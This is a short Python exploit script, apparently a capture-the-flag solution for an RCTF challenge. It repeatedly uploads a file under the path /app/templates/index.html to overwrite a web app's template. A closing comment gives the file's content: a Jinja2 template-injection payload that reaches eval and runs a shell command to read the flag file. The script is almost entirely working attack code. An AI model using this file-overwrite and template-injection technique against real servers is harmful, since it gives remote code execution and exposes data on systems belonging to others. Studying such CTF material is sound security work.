import requests,time,threading

subaddr = "http://localhost:3000/"

def newThread(fun,*args):
    return threading.Thread(target=fun, args=args)

def exec():
    r = requests.get(subaddr)
    x = r.text
    if 'RCTF' in x:
        print(x)

def check():
        newThread(exec,).start()

def upload():
    while True:
        file_data = {'file-upload':('/app/templates/index.html',open('1.txt','rb'))}
        r = requests.post(subaddr,files=file_data)
        print((r.text).encode('utf-8'))
        newThread(check,).start()


if __name__ == '__main__':
    upload()

#1.txt内容为{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}